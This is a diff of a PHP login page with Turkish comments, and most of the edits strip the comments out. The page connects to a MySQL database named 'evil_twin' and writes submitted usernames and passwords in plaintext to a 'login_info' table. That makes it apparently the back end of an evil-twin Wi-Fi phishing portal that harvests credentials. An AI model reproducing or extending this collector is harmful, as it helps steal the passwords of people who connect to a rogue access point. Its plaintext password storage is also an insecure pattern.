@@ -1,5 +1,5 @@
 <?php
-// connection.php içinde error reporting ayarını ekleyin:
+
 mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
 $baglanti = mysqli_connect("localhost", "root", "", "evil_twin");
 if (!$baglanti) {
@@ -8,17 +8,14 @@ if (!$baglanti) {
 
 $message = "";
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // POST verilerini kontrol et (debug için)
-    // var_dump($_POST); exit;
-    
-    // Formdan gelen verileri güvenli hale getir
+   
     $name = mysqli_real_escape_string($baglanti, $_POST["name"]);
     $password = mysqli_real_escape_string($baglanti, $_POST["password"]);
     
-    // Veritabanına ekleme sorgusu
+
     $ekle = "INSERT INTO `login_info` (name, password) VALUES ('$name', '$password')";
     
-    // Sorguyu çalıştır ve mesajı ayarla
+ 
     if (mysqli_query($baglanti, $ekle)) {
         $message = "<p class=\"success\">Kayıt başarıyla eklendi.</p>";
     } else {
@@ -82,7 +79,7 @@ span.psw {
   padding-top: 16px;
 }
 
-/* Küçük ekranlar için stil ayarı */
+
 @media screen and (max-width: 300px) {
   span.psw {
      display: block;
